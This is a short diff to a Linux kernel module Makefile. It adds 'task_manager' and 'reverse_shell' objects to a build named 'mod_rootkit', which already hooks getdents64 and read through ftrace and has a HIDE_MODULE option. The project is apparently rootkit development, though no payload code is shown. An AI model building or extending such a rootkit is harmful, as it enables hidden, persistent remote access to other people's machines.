@@ -6,6 +6,8 @@ HIDE_MODULE ?= 0
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
+                       src/tasks/task_manager.o \
+                       src/tasks/reverse_shell.o \
                        src/hooks/x64_sys_getdents64.o \
                        src/hooks/x64_sys_read.o \
                        src/utils/ftrace_utils.o \
